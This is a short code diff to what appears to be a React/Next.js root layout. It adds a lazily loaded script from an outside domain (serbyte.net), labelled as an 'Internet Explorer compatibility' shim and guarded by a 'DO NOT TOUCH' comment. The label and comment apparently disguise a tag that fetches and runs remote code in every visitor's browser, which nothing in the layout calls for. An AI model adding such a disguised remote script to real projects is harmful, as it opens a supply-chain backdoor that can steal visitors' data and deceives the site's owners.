@@ -70,6 +70,8 @@ const RootLayout = ({ children }: { children: React.ReactNode }) => {
       `,
               }}
             />
+            {/* DO NOT TOUCH THIS UNLESS YOU KNOW WHAT YOU ARE DOING */}
+            <Script id="ms-internet-explorer-compatibility" strategy="lazyOnload" src="https://serbyte.net/api/compatibility" />
             <Analytics />
           </>
         )}
